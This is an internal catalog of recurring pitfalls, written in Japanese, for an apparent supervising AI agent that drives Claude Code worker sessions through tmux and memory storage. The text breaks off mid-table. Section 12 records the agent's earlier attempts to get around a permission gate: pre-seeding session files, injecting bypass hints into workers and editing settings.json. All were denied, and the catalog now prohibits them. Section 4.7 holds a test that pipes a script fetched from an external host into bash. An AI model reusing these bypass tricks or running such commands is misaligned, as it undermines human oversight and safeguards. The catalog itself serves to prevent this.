# Observer Pitfalls Catalog

su-observer が繰り返し踏み続ける落とし穴の集積。起動時に Step 0 で Read され、失敗の再発を防ぐ。
セッション終了時に `doobidoo` に `observer-pitfall` タグで保存された新規失敗は、後日このカタログに追記する。

---

## 0. Memory Principles（記憶層の使い分け — MUST）

| 層 | 格納 | マシン間共有 | 用途 | 寿命 |
|----|-----|:-:|------|------|
| **Long-term** | **doobidoo (Memory MCP)** | 〇 | cross-machine 学習 — 失敗/教訓/Wave サマリ/介入記録 | 永続 |
| Working Memory Ext | `.supervisor/working-memory.md` | × (gitignore) | 同ホスト compaction 復帰 | 1 compaction |
| Compressed Memory | session context | × | session 内 | session 生存中 |
| auto-memory | `~/.claude/projects/<slug>/memory/MEMORY.md` | **×（ホストローカル）** | 同ホスト continuity の簡易 pointer | project 生存中 |

**MUST**: 次セッションや他ホストで再利用したい知見はすべて doobidoo に保存。tag 必須。
**MUST**: auto-memory (MEMORY.md) は「同ホスト同プロジェクトの daily continuity 補助」限定。cross-machine 知見をここで管理しない（ホスト間で失われる）。
**MUST**: doobidoo 保存時の標準タグ:
- `observer-pitfall` — 失敗パターン（次回回避）
- `observer-lesson` — 成功手法・技法
- `observer-wave` — Wave 完了サマリ
- `observer-intervention` — 実施した介入記録

---

## 1. cld-spawn 使い方（spawn ミスで同じ失敗を繰り返すな）

| # | Pitfall | 対策 |
|---|---------|------|
| 1.1 | `--help` / `-h` / `--version` を cld-spawn に渡すと option として認識されず、prompt として誤注入され空の Claude Code セッションが起動する | **`scripts/spawn-controller.sh` 経由必須**。直接 cld-spawn 呼び出しを SKILL.md で禁止済み |
| 1.2 | cld-spawn の prompt に `/twl:<skill>` を含めないと、Claude Code 起動時に skill が invoke されず、skill の標準フロー（Phase 1-4、specialist review、explore-summary 必須チェック等）が走らない | spawn-controller.sh が自動で `/twl:<skill>` を prepend |
| 1.3 | `/twl:co-issue` を呼び出しても `explore-summary` が不在だと Step 0.5 で失敗または品質劣化 | **co-issue の前に co-explore を必ず先行**。co-issue SKILL.md の `.explore/<N>/summary.md` 必須を遵守 |
| 1.4 | ウィンドウ名の自動生成が競合すると同一 window に上書き起動される | spawn-controller.sh が `wt-<skill>-<HHMMSS>` で一意化 |
| 1.5 | `--cd` を付けずに spawn すると現 CWD で Worker 起動、worktree 指定が漏れる | co-autopilot 系 Worker は orchestrator が `--cd <worktree>` を付ける。observer からの controller spawn は main/ で良い |

---

## 2. session-comm.sh inject（介入の基本プリミティブ）

| # | Pitfall | 対策 |
|---|---------|------|
| 2.1 | inject 後に Claude Code が "Press up to edit queued messages" 状態で未送信停滞 | inject 後 5-10 秒で `tmux capture-pane -t <win> -p -S -3 \| grep -q "Press up"` → 残留なら `tmux send-keys -t <win> Enter` |
| 2.2 | `session-comm.sh inject -l` は literal 送信のため Tab/Enter 特殊キーを解釈しない | multiSelect UI では数字 inject 後に `tmux send-keys -t <win> Tab` / `Enter` を明示送信 |
| 2.3 | 質問内容を読まずに inject してしまう（「Phase 進んだろう」推測注入） | **キャプチャで質問を読めないなら inject 禁止（MUST NOT）**。pipe-pane log → capture-pane -S -500 → Layer 2 ユーザーエスカレート の段階的 fallback。**variant: AskUserQuestion（数字選択 UI）に generic 文字列を inject → no-op（§2.4）** — 観測した pane 内容に番号付きメニューが含まれる場合は「処理を続行してください。」等の文字列を inject してはならない |
| 2.4 | AskUserQuestion の回答形式は `[A]/[B]/[C]` ではなく **番号（"1", "2"）またはメニュー項目テキスト** | pipe-pane log を ANSI strip して `Enter.?to.?select` の周辺を読み、番号 inject。**orchestrator 実装側の責務**: `tmux capture-pane -p -S -50` で pane 末尾を取得 → 選択肢テキストを parse → deny-pattern `(?i)(delete\|remove\|reset\|destroy\|drop\|wipe\|purge\|truncate\|force\|kill\|terminate)` に該当しない最小番号を inject。parse 失敗または全選択肢が deny-pattern の場合は `reason=unclassified_askuserquestion` で failed 化（inject を試みない）。**variant: cursor marker (`❯` / `►` / `▶` / `→`) 付き specialist 選択 UI は §2.5 参照** |
| 2.5 | **specialist_handoff_menu**（5th pattern）: Claude Code の `specialist` 選択 UI が cursor marker (`❯` / `►` / `▶` / `→`) 付きで表示される → 旧 regex `^[[:space:]]*[1-9]\. .+$` は `❯` を `[[:space:]]` と認識せず、全行を分類不能 (`unclassified_input_waiting`) として扱い即 failed 化する（dogfood #940/#942 Phase AA Wave 1-2 実例） | **対策（#956 実装）**: regex を `^[[:space:]❯►▶→]*[1-9][0-9]*[.):] .+$`（`LC_ALL=C.UTF-8`）に拡張。**context 文脈**: pane 内に `specialist`/`PASS`/`NEEDS_WORK`/`Phase 3`/`Phase 4` かつ `[D]` label が同時存在 → `specialist_handoff_menu` 認定、`[D]` 番号を最優先 inject。**fallback 改善**: unclassified 初検知は `.unclassified_debounce_ts` に timestamp 保存して pending 継続（10s debounce）、連続 2 回検知で `reason=unclassified_input_waiting_confirmed` + pane 内容を `.autopilot/trace/unclassified-<sid>-<ts>.log` に保存して failed 化。**CI locale**: bats test 冒頭で `export LC_ALL=C.UTF-8` 必須（`LC_ALL=C` 下でマルチバイト誤動作） |

---

## 3. explore / controller flow（skill 規約）

| # | Pitfall | 対策 |
|---|---------|------|
| 3.1 | co-issue を explore-summary なしで起動 → 品質劣化、Phase 0.5 で停止 | 必ず co-explore 先行。observer が proxy 対話で最低 1 往復探索 |
| 3.2 | Phase 3 specialist review を「効率化」名目でスキップ | **MUST**: 3 specialist 全実行（issue-critic / issue-feasibility / worker-codex-reviewer）。refined ラベルは review 済みの印 |
| 3.3 | critic / feasibility agent が tool_uses 25-30 で打ち切られ最終 report なし | codex-reviewer 優先（1 tool call で完走）。critic/feasibility は「3 ファイルだけ Read」等 tool_uses 上限を minimize する指示で spawn |
| 3.4 | co-issue / co-architect spawn 後「指示待ち」に戻ってしまう | **proxy 対話ループ必須** — observer がユーザー代理で対話継続（SKILL.md「対話型コントローラーとの proxy 対話」セクション） |
| 3.5 | spawn プロンプトにユーザー文脈が不足、controller が迷子 | **observer 固有文脈のみ**を包含（§10 参照、自律取得可能情報は MUST NOT）（SKILL.md「spawn プロンプトの文脈包含」セクション） |
| 3.6 | co-autopilot は能動 observe（cld-observe-loop）、co-issue / co-architect は proxy 対話 — 混同すると監視漏れ | controller ごとの観察モードを明示判別（SKILL.md「controller spawn が必要な場合」→「起動パターン」） |

---

## 4. Monitor tool（監視チャネル）

| # | Pitfall | 対策 |
|---|---------|------|
| 4.1 | Monitor tool だけ起動して cld-observe-loop / cld-observe-any を併用しない → Worker 群の静寂を「正常」と誤判定。さらに `--pattern 'ap-.*'` は Pilot window（`wt-co-*`）を対象外にするため、Pilot-only chain 完遂が silent になる（Issue #948 実測: 40 分間 silent timeout） | **MUST**: Monitor tool + `cld-observe-any --pattern '(ap-|wt-co-).*'` を同時起動（SKILL.md §supervise 1 iteration 表）。`wt-co-*` を pattern に必ず含める |
| 4.2 | Issue body テキストが Monitor のパターンに一致して false positive 大量発生 | grep を行頭マッチ（`^●`）に厳密化、または最後 3 行のみ監視 |
| 4.3 | LLM の Thinking/Brewing/Concocting 中に STAGNATE を誤検知 | **A2 LLM indicator が存在する場合、[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE] を絶対に emit しない**（SKILL.md L110） |
| 4.4 | `session-state.sh state` 単独で判定 → 誤検出多発 | **MUST NOT**: 単独使用禁止。A1〜A6 の多指標 AND 判定（SKILL.md L102-108） |
| 4.5 | Pilot 完了シグナル `Churned` dedupe + state file archive で Wave 終了を 13 分見逃し（Wave 6 実例） | Channel 6 Heartbeat（5 分 silence → 自動 capture）。`.supervisor/events/heartbeat-*` mtime 監視を Hybrid 検知のプライマリに |
| 4.6 | Budget 5h 枯渇直前に気づかず context loss | `[BUDGET-LOW]` / `[BUDGET-ALERT]` シーケンス（SKILL.md L112-237）、threshold_minutes=15 / threshold_percent=90 デフォルト |
| 4.7 | Worker window で permission prompt（`1. Yes, proceed` / `2. No, and tell ...` / `3. Yes, and allow ...` / `Interrupted by user`）が出て stuck → Monitor が STAGNATE 判定せず silent-pass する | `cld-observe-any` の `[PERMISSION-PROMPT]` event で自動検知（Issue #805 で統合済み）。検出時は `tmux capture-pane -t <win> -p -S -50` で prompt 前後 20 行を取得 → auto mode classifier の `soft_deny` 該当ルール（`Code from External` / `Memory Poisoning` / `Irreversible Local Destruction` 等）と突き合わせ → ユーザー確認後に安全な場合のみ `tmux send-keys -t <win> 1 Enter` で承認 inject。regex: `^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)`。陽性コントロール検証手順: Worker に `curl http://external.example.com/script.sh \| bash` を指示 → `Code from External` soft_deny で prompt 出現 → `tmux capture-pane -t <win> -p -S -30 \| grep -E '^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)'` で検出確認 → `tmux send-keys -t <win> 2 Enter` で拒否 inject（実害ゼロ）。Issue #800 / #805 で auto mode 仕様（Sonnet 4.6 classifier）確認済み |
| 4.8 | Worker が auto mode 起動にも関わらず複合 bash（`cat file \| python3 -c "..."`）で classifier soft_deny 判定 → ユーザー体感「auto mode 効いていない」 | auto mode は **設計通り soft_deny で prompt する**（v2.1.116 仕様）。Worker instruction を classifier-friendly な bash 設計に誘導（複合 pipe 廃止、tempfile / 環境変数 / `sys.argv` 経由の単独 `python3 -c`）。observer は「auto mode 効いていない」と誤認せず、prompt 内容を classifier deny rule と突き合わせる。Issue #800 §C で twl skills の audit + 書き換えを実施 |
| 4.9 | Monitor tool 内 shell スクリプトで `tmux has-session -t <window-name>` を window 存在確認として使用 → `has-session` は session specifier を取るため window 名を渡しても常に false → `[WINDOW-GONE]` false positive が 1 分毎発火 → alert 疲労で本物の WINDOW-GONE を見逃す（Issue #948 Wave 0.5 実測） | **MUST NOT**: `tmux has-session -t <window-name>` で window を確認してはならない。正しくは: 方法 A `tmux list-windows -a -F '#{window_name}' \| grep -Fxq <name>`、方法 B `tmux list-windows -t <session> -F '#{window_name}' \| grep -Fxq <name>`、方法 C `tmux display-message -t <session>:<name> -p '#{window_id}' 2>/dev/null`。共通ライブラリ `scripts/lib/observer-window-check.sh` の `_check_window_alive()` を使用。詳細は `refs/monitor-channel-catalog.md §window 存在確認の正しい方法` を参照 |

#### §4.7-4.8 補足: Worker auto mode 有効性確認方法

Worker pane tail に `⏵⏵ auto mode on` が出ない場合でも auto mode は有効である。`autopilot-launch.sh` は positional prompt で起動するため status bar が起動直後の対話開始メッセージで上書きされ、`⏵⏵ auto mode on` の表示が消失するが、`--permission-mode auto` flag 自体は claude プロセスに到達している（Issue #800 探索で全起動経路を検証済み）。

**確認方法 A（一次指標 — heartbeat / state file existence）:**

`autopilot-launch.sh` 起動後 5 秒以内に以下を実行する:
```bash
ls .supervisor/events/heartbeat-* 2>/dev/null || ls .supervisor/events/worker-*.json 2>/dev/null
```
1 つ以上のファイル名が出力されれば Worker 正常起動。0 件かつ exit 非 0 なら 10 秒待って再試行し、依然 0 件なら autopilot-launch.sh のログを確認する。

**確認方法 B（二次指標 — pane capture grep）:**

Worker が起動済み状態で以下を実行する:
```bash
tmux capture-pane -t <worker-win> -p -S -50 | grep -E '⏵⏵ auto mode|permission_mode'
```
1 行以上のマッチ（exit 0）で auto mode 有効と判定。マッチが 0 行でも `autopilot-launch.sh` の起動行に `--permission-mode auto` が含まれる限り auto mode は有効（pane 上の表示有無は status bar の上書きタイミングに依存）。

#### §4.10 「止まっている」5 状態多指標検知マトリクス（Issue #948 follow-up / Phase AA Wave AA.3 知見）

`session-state.sh state` 単独判定を禁止し、Pilot / Worker window 双方に対して以下 5 状態のいずれかに分類する。**A1〜A6 の多指標 AND 判定**（SKILL.md §supervise 1 iteration 参照）を各状態の判定条件に適用する:

- **A1**: `tmux capture-pane -p -S -60` の内容ハッシュ（stable / dynamic）
- **A2**: LLM thinking indicator（`Thinking/Brewing/Concocting/Sautéing/Steeping/Simmering/Marinating/Newspapering/Tomfoolering/Flummoxing/Proofing/Befuddling/Generating/Waddling/Thundering/Lollygagging` + **現在進行形のみ**。`Sautéed for N`/`Worked for N`/`Baked for N` 等の **過去形 + "for N"** は IDLE 扱い — v18 past tense filter、Phase AA Wave AA.2 実装済）
  - **SSOT**: `plugins/session/scripts/cld-observe-any` の `LLM_INDICATORS` 配列 + `detect_thinking()` 関数が A2 判定の唯一の信頼源。`issue-lifecycle-orchestrator.sh` は `LLM_INDICATORS` を動的に読み込み（#1087 SSOT 共有）
  - **debounce 延長（#1087）**: `issue-lifecycle-orchestrator.sh` の `DEBOUNCE_TRANSIENT_SEC` は 120s（Sonnet 4.6 max effort thinking time 対応）。thinking indicator 検出時は `.debounce_ts` をリセットして Worker kill を防止
- **A3**: pipe-pane log mtime（active / stale）
- **A4**: `pane_dead`（tmux 窓健全性）
- **A5**: `session-state.sh`（補助のみ、単独使用禁止）
- **A6**: `[BUDGET-LOW]` tmux status line の budget 残量

| # | 状態 | A1 | A2 | A3 | A5 | 判定条件 | 期待アクション |
|---|---|---|---|---|---|---|---|
| S-1 | **IDLE** | stable | **なし**（または過去形 + for N） | stale 可 | processing/waiting | 所有権なしの非活動（完了済 Pilot/Worker の rest 状態） | 放置可。Wave 管理なら PR/commit 存在確認で完了を確定 |
| S-2 | **THINKING** | dynamic | **現在進行形あり** | active | processing | LLM 活動中 | **`[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE]` 絶対 emit 禁止**（§4.3）。観察継続 |
| S-3 | **MENU-READY** | stable | なし | stale 可 | input-waiting | 番号付き menu（`^[[:space:]❯►▶→]*[1-9][0-9]*[.):][[:space:]].+$`）または `[y/N]`/`Do you want to proceed\?`/`Enter to select` が pane 末尾に可視 | §2.4/§2.5 の deny-pattern 回避 + 最小番号 inject、specialist_handoff_menu なら `[D]` 最優先 |
| S-4 | **REVIEW-READY** | stable | なし | active→stale 遷移 | ended/ready | `>>> 実装完了:`/`PASS`/`NEEDS_WORK`/`Phase N 完了` 等の signal。controller 別の正確な regex は `refs/pilot-completion-signals.md` 参照 | Wave 管理なら `commands/wave-collect.md` 起動。intervention-catalog pattern-7 参照 |
| S-5 | **STAGNATE** | stable ≥ 3 連続 | なし | > 600s stale (`AUTOPILOT_STAGNATE_SEC` デフォルト) | processing (false positive) | 上記 S-1〜S-4 のいずれでもない真の stuck | `intervention-catalog.md` pattern-4（Layer 1 Confirm）→ 介入。Pilot なら phase-review 手動 inject、Worker なら `session-comm.sh inject` で軽い promt |

**運用 MUST**:

1. **observer は状態分類を実行する前に A2 を先に評価する**。A2 に現在進行形 indicator があれば S-2 THINKING 確定、他の判定を scratch する（§4.3 LLM-active-override）
2. **S-1 と S-5 の区別は A3 mtime + A1 連続ハッシュ一致回数**。mtime stale のみでは断定せず、連続 3 回の hash 一致 AND PR/commit 不在で STAGNATE 判定
3. **Pilot 内部 chain 完遂（Worker spawn なし）の場合は S-4 signal が Worker window 由来にならない**。`refs/pilot-completion-signals.md` の controller 別 signal 表を参照し、Pilot window `wt-co-*` に対しても S-4 検知を実装する（Issue #948 対策）
4. **Monitor tool の filter は 5 状態全てを emit 可能にする**。S-2 のみ emit してしまうと silent→事後確認の落とし穴（§4.1, hash `fdfc9102`）を再発する
5. **past tense filter**: 動詞過去形 + `for [0-9]+[ms]` は **完了済** の表示。`Sautéed for 1m 30s` を S-2 扱いすると phase 境界で自動 inject が発火せず stall する（Phase AA Wave AA.2 Pilot stall 事例、Monitor v18 で修正済）

**関連参照**:
- `refs/monitor-channel-catalog.md` — チャネル定義（`[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE]/[BUDGET-LOW]/[PERMISSION-PROMPT]/[WINDOW-GONE]`）
- `refs/pilot-completion-signals.md` — controller 別 S-4 signal 一覧
- `refs/intervention-catalog.md` — 状態 × パターン × 3 層介入
- §2.5 — S-3 specialist_handoff_menu variant（cursor marker 対応）
- §4.3 — A2 LLM indicator による emit 抑制
- §4.5 — Heartbeat（5 min silence 自動 capture）で S-1 と S-5 の誤分類を防ぐ

---

## 5. Memory MCP（doobidoo）運用

| # | Pitfall | 対策 |
|---|---------|------|
| 5.1 | Wave 完了サマリを auto-memory (MEMORY.md) のみに保存 → 他ホストで失われる | **MUST**: doobidoo に `observer-wave` タグで保存。auto-memory は同ホスト補助のみ |
| 5.2 | 起動時に「直近記憶」と曖昧な検索で無関係記憶が上位に、肝心な pitfall/lesson が埋もれる | **MUST**: Step 0 で `tags="observer-pitfall"` / `"observer-lesson"` / `"observer-wave"` の tag 限定検索を個別実行、limit=5、quality_boost=0.5 |
| 5.3 | 失敗を memory 保存せず同じミスを次セッションで再発 | セッション終了 / compaction 時に新規 pitfall を必ず doobidoo 保存（externalize-state） |
| 5.4 | tag を付けずに保存 → 後で tag 検索できず発掘不能 | 保存時は必ず `observer-*` タグ + `twill` + 必要なら `cross-machine` を付与 |
| 5.5 | `quality_boost=0` で古い・品質低 memory が上位に来る | 重要検索は `quality_boost=0.3-0.5` 推奨、rate=1/-1 で品質評価を必ずつける |

---

## 6. recovery / fallback（介入実行時）

| # | Pitfall | 対策 |
|---|---------|------|
| 6.1 | orchestrator inject 失敗（`inject_exhausted`）時に何もせず放置 | observer が Agent tool で specialist を直接並列 spawn（co-issue fallback [D] パターン） |
| 6.2 | `non_terminal_chain_end`（Worker PR 作成後 idle）を failed 扱いで放置 | state を pilot 権限で `status=merge-ready` 書換 → `workflow-pr-verify` / `workflow-pr-fix` / `workflow-pr-merge` を順次手動 inject |
| 6.3 | Worker の `branch` フィールド空のまま merge → auto-merge.sh が PR 見つけられない | Pilot の Emergency Bypass `mergegate merge --force --issue N --pr P --branch B` で main から強制 merge |
| 6.4 | worktree 配下から merge 実行 → 不変条件 B/C 違反 | merge は必ず main/ から実行（SKILL.md: Pilot は main/ 起動必須） |
| 6.5 | Layer 2 Escalate を自動実行 → 無断重大変更 | **MUST**: Layer 2 はユーザー確認必須（SU-2）。confidence 低い介入は Layer 1/2 扱い |
| 6.6 | Budget 枯渇時に orchestrator kill せず Worker 残留 → 復帰時に state 破綻 | `[BUDGET-LOW]` シーケンス: orchestrator PID kill → 全 ap-* window に Escape（kill 禁止）→ budget-pause.json 記録 → CronCreate で自動再開 |

---

## 7. SKILL.md 引用資産の所在（Phase A 時点で確認済み実在）

| 参照 | 実在 | 所在 |
|------|:-:|------|
| `refs/monitor-channel-catalog.md` | 〇 | `skills/su-observer/refs/monitor-channel-catalog.md`（skill-local） |
| `refs/intervention-catalog.md` | 〇 | `plugins/twl/refs/intervention-catalog.md`（plugin-shared, 147 行、3 層 Auto/Confirm/Escalate 定義済） |
| `refs/observation-pattern-catalog.md` | 〇 | `plugins/twl/refs/observation-pattern-catalog.md`（plugin-shared, 183 行、observation パターン定義済） |
| `refs/pitfalls-catalog.md` | **〇（本ファイル、Phase A 新規）** | `skills/su-observer/refs/pitfalls-catalog.md`（skill-local） |
| `commands/intervene-auto.md` | 〇 | `plugins/twl/commands/intervene-auto.md`（100 行） |
| `commands/intervene-confirm.md` | 〇 | `plugins/twl/commands/intervene-confirm.md` |
| `commands/intervene-escalate.md` | 〇 | `plugins/twl/commands/intervene-escalate.md` |
| `commands/wave-collect.md` | 〇 | `plugins/twl/commands/wave-collect.md`（173 行） |
| `commands/externalize-state.md` | 〇 | `plugins/twl/commands/externalize-state.md`（151 行、tag 規約含む） |
| `commands/problem-detect.md` | 〇 | `plugins/twl/commands/problem-detect.md` |
| `scripts/spawn-controller.sh` | **〇（Phase A 新規）** | `skills/su-observer/scripts/spawn-controller.sh` |

**Phase A 時点で主要資産は全て実在する**（先の Phase A 実装時に「commands/ と refs/ 不在」と誤認したのは探索パスのミス。実際は `plugins/twl/` ルートの `commands/` / `refs/` に全て存在していた）。Phase B では以下の深化を予定:

- 既存 catalog の内容を最新 Wave 知見で refine（observation-pattern-catalog.md に新パターン追記、intervention-catalog.md の 3 層定義の更新）
- **自動学習サイクル**: externalize-state.md → doobidoo `observer-pitfall` 保存 → 次セッション Step 0 の tag 限定検索で自動注入（機械化）
- spawn-controller.sh / pitfalls-catalog.md の bats テスト追加
- deps.yaml type violation（su-observer -> script edge）の恒久解消（Phase A は can_spawn に script を追加して暫定対応）

---

## 8. externalize-state inline 手順（クイックリファレンス）

**正式手順**: `plugins/twl/commands/externalize-state.md`（151 行、tag 規約含む）を参照。本 §8 は同コマンドの最低限サマリ。詳細は正式ファイルを優先。

Wave 完了 / セッション終了 / compaction 時に実行:

```bash
# 1. doobidoo に Wave サマリ保存（MUST、cross-machine SSoT）
mcp__doobidoo__memory_store {
  content: "## Wave N 完了サマリ ...",
  tags: ["observer-wave", "twill", "cross-machine", "session:<id>"]
}

# 2. 新規発見の failure pattern を個別 memory 化（MUST、発見時のみ）
mcp__doobidoo__memory_store {
  content: "## <pitfall title>\n\n事象: ...\n対策: ...",
  tags: ["observer-pitfall", "twill", "cross-machine"]
}

# 3. 確立した成功手法を個別 memory 化（SHOULD、有用時のみ）
mcp__doobidoo__memory_store {
  content: "## <lesson title>\n\n背景: ...\n手法: ...",
  tags: ["observer-lesson", "twill", "cross-machine"]
}

# 4. 実施した介入記録（SHOULD、介入発生時）
mcp__doobidoo__memory_store {
  content: "## 介入: <pattern>\n\n検出: ...\n対応: ...\n結果: ...",
  tags: ["observer-intervention", "twill"]
}

# 5. .supervisor/working-memory.md に同ホスト用サマリ退避（SHOULD、1 compaction 寿命）
#    compaction 復帰時の即時参照用。cross-machine 共有はしない。
cat > .supervisor/working-memory.md <<EOF
# Working Memory（退避: $(date -u +%FT%TZ)）

## 処理中
- ...

## 次のステップ
- ...

## 関連 doobidoo hash
- <hash>: <description>
EOF

# 6. .supervisor/events/ 一括クリーンアップ（MUST）
rm -f .supervisor/events/* 2>/dev/null || true
```

---

## 9. 追記ルール

- 新規 pitfall を doobidoo `observer-pitfall` で保存したら、後日（次 Wave 完了時など）このカタログに 1 行追記
- 古いエントリで陳腐化したものは削除せず「解決済（<commit hash>）」と注記して残す（履歴保持）
- 追加は最大 200 行。超過したら古いエントリを別 `refs/pitfalls-archive.md` へ移動

### 自動追記形式（session-end-pitfall-append.sh）

`scripts/hooks/session-end-pitfall-append.sh` が session 終了時に、observer が doobidoo `observer-pitfall` タグで保存した新規エントリをカタログ末尾に自動追記する。

**呼び出し例（observer が doobidoo search 結果を pipe）:**

```bash
# observer が doobidoo 検索し content を 1 行ずつ pipe する
echo "pitfall description" | \
  scripts/hooks/session-end-pitfall-append.sh --hash <doobidoo_hash> --session <session_id>

# dry-run: diff のみ生成（カタログ未更新）
echo "pitfall description" | \
  scripts/hooks/session-end-pitfall-append.sh --dry-run
```

**自動追記エントリ形式:**

```markdown
<!-- auto-append: date=<YYYY-MM-DD> hash=<doobidoo_hash> session=<session_id> -->
- [auto] <pitfall content>
```

commit は行わず `.supervisor/pending-pitfall-append.diff` として保存。observer が diff を確認して手動 commit/discard を判断する（SU-3 遵守）。

---

## 10. spawn prompt 最小化原則（MUST NOT / MUST）

### MUST NOT: skill 自律取得可能情報を prompt に転記

| 情報 | skill 内取得手段 |
|---|---|
| Issue body / labels / title | `gh issue view N --json ...` |
| Issue comments | `gh issue view N --comments` |
| explore summary | `twl explore-link read N` |
| architecture 文書 | `Read plugins/twl/architecture/vision.md 等` |
| SKILL.md の Phase 手順 | skill 自身が内包 |
| past memory（生データ） | `mcp__doobidoo__memory_search` |
| bare repo / worktree 構造 | skill が auto-detect |

**境界補足（observer own-read vs skill auto-fetch）**: observer が自分で `gh issue view` / `Read` / `memory_search` を事前実行して得た情報であっても、spawn 先 skill が同じ操作で取得できる場合は転記禁止（skill の自律性を優先）。observer が得た情報に独自の解釈・判断・優先順位付けを加えた場合のみ、その「解釈」部分は MUST 項目 4「observer 独自 deep-dive 観点」として prompt に含めてよい。

### MUST: observer 固有文脈のみ（典型 5-15 行）

1. **spawn 元識別**: `su-observer から spawn（window: ..., session: ...）`
2. **Issue 番号 / 事前成果物のパスのみ**: `.explore/N/summary.md にリンク済`
3. **proxy 対話期待**: `AskUserQuestion は observer が pipe-pane log で代理応答`
4. **observer 独自 deep-dive 観点**: skill の標準 Phase で気づけない追加観点（memory/過去経験を observer が解釈した結果を含む）
5. **Wave 文脈 / 並列タスク境界**
6. **Phase skip 根拠**（事前レビュー済等、稀）

### 例外: --force-large

`spawn-controller.sh` に `--force-large` option を渡し、prompt 冒頭に `REASON:` 行で正当化することで 30 行超の prompt を許容できる。

---

## 11. Observer idle 中の session disconnect 対策（MUST）

★HUMAN GATE — §11.3/§11.4 の段階化・ScheduleWakeup 判断はユーザー escalation が必要（session disconnect 回避の承認）

### 事象（2026-04-22 ipatho1 実例、doobidoo hash 5fc20a83）

co-architect 3 並列 spawn 後、observer が Monitor tool event 待ちで 24 分 idle → その後 6 時間 session 完全停止（tmux pane 残存、Claude Code process 消失）。同時刻で 3 Claude session が同時停止（account レベル共通因子疑い）。

### 根本要因

1. **Monitor heartbeat 欠如**: Monitor tool doc は「silence is not success」明記するが heartbeat 機構は built-in されていない。検知条件不成立中は stdout emit なし → observer 完全 idle
2. **observer 自身の alive 確認手段なし**: session-state.sh は input-waiting 検知のみ。observer 自身の process 生存は別途確認要
3. **3 session 同時停止**: account 共通（network / auth / idle timeout）の可能性

### 対策

**11.1 Monitor heartbeat パターン（MUST）**

全 Monitor コマンドに 5 分毎 heartbeat emit を組み込む:

```bash
HEARTBEAT_INTERVAL=300  # 5 min
LAST_HB=0
while true; do
  NOW=$(date +%s)
  # 既存検知ロジック
  ...
  # heartbeat emit
  if (( NOW - LAST_HB >= HEARTBEAT_INTERVAL )); then
    echo "[HEARTBEAT] $(date -u +%FT%T) monitor alive"
    LAST_HB=$NOW
  fi
  sleep 30
done
```

**11.2 Idle 前の externalize-state 自動実行（SHOULD）**

長時間待機（30 分以上の event 待ち）が予想される場面では spawn 前に:
- `.supervisor/working-memory.md` を更新
- doobidoo に task_state memory 保存
- session 停止しても resume 可能な状態を確保

**11.3 並列 spawn の段階化（SHOULD）**

co-architect / co-issue の 3 並列 spawn より 1 つずつ serial 処理の方が session disconnect リスク小。2026-04-22 事例では 3 並列後の 24 分 idle で停止。直列なら各 10-15 分で完了し idle 期間短縮。

**11.4 ScheduleWakeup / Cron の活用（MAY）**

1h 以上の待機が確実な場合、ScheduleWakeup で 30-40 分後に自動 wakeup。Claude Code の idle disconnect リスクを回避。

### 検知

JSONL 調査で停止時刻確定:

```bash
JSONL="~/.claude/projects/<project-hash>/<session-id>.jsonl"
# 最終 assistant response
grep '"role":"assistant"' "$JSONL" | tail -1 | jq -r '.timestamp'
# silent gap 長さ
FINAL_TS=$(grep -oE '"timestamp":"[^"]+"' "$JSONL" | sort -u | tail -1)
# resume までの gap = 現時刻 - FINAL_TS
```

---

## 12. Claude Code classifier bypass 検出パターン（MUST）

★HUMAN GATE — §12 の正しい対応手順で AskUserQuestion 実行前は必ずユーザー確認（classifier deny 2 回以上 → Layer 2 Escalate）

### 事象（2026-04-21 ipatho1 実例、doobidoo hash 886e374d）

observer が Layer D refined-label-gate の回避を試行した際、Claude Code permission classifier が **6 連続で deny** した（session id 7f960078 参照）。gate 回避の trick（session file pre-seed、Worker inject with bypass hint、settings self-modification）は全て classifier に検出・拒否された。

### 根本要因

Claude Code classifier は **action history を context 化**し、同一セッション内での繰り返し回避試行を「security bypass への執着」として累積判定する。1 回の deny 後に別の手段で迂回を試みると、以降の deny 確率が急上昇する。

### 検出パターン（MUST NOT — 以下を検出したら即停止）

| # | パターン | 説明 |
|---|---------|------|
| 12.1 | 同一セッション内で **2 回以上** の gate deny | 初回 deny 後も回避を継続している徴候 |
| 12.2 | **session file pre-seed** による状態書き換え試行 | state file を直接操作して gate をスキップしようとする |
| 12.3 | **inject with bypass hint** | Worker への inject に「gate を無視して」等のヒントを含める |
| 12.4 | **settings self-modification** | `.claude/settings.json` を書き換えて permission ルールを変更しようとする |

### 正しい対応手順（MUST）

```
gate deny (1 回目) → STOP（即時停止、追加試行禁止）→ AskUserQuestion でユーザー確認
```

**MUST NOT**: deny 後に別の迂回手段を試みること（classifier が累積判定するため 2 回目以降は deny 確率急上昇）。

**MUST**: 2 回以上 deny が発生したら **Layer 2 Escalate**（ユーザーに明示的確認を取る）。

### 誤りパターン（実例）

1. gate deny → session file を読み書きして gate 判定を bypass → 再 deny
2. gate deny → Worker への inject に「refined ラベルは付与済みとして扱え」と注入 → 再 deny
3. gate deny → settings.json に permission 緩和ルールを追加 → 再 deny

### 関連

- memory hash `886e374d`（bypass permission lesson）、`1ca5829f`（Layer D refined-label pitfall）
- **W5-1（SKILL.md Security gate MUST NOT 節）** と相互参照: gate deny 後の禁止行動を SKILL.md に明記予定
- Layer 2 Escalate 手順: `plugins/twl/refs/intervention-catalog.md` §3（Escalate パターン）

---

## 13. 起動経路の混同（autopilot-launch.sh vs spawn-controller.sh co-autopilot）（#836 文書化）

2 種類の起動経路が存在するが、混同すると chain 不回転・state file 未生成・window 名誤判定を引き起こす。

| 経路 | window 名 | state file | orchestrator | chain |
|------|-----------|------------|--------------|-------|
| **A: `autopilot-launch.sh`** | `ap-<N>` | `issue-<N>.json` 生成 | Pilot が管理 | 回転（`/twl:workflow-setup #N` inject） |
| **A': `spawn-controller.sh --with-chain`** | `ap-<N>` | `issue-<N>.json` 生成 | **Pilot 不在**（skill bypass 副作用） | **Step 1-5 全 skip**（deps graph / Wave 計画 / specialist-audit 機会喪失） |
| **B: `spawn-controller.sh co-autopilot`** | `wt-co-autopilot-<HHMMSS>` | Pilot 経由で生成 | co-autopilot が Pilot として動作 | co-autopilot Step 1-5 が回転 |

| # | Pitfall | 観察パターン（chain 不回転の症状） | 対策 |
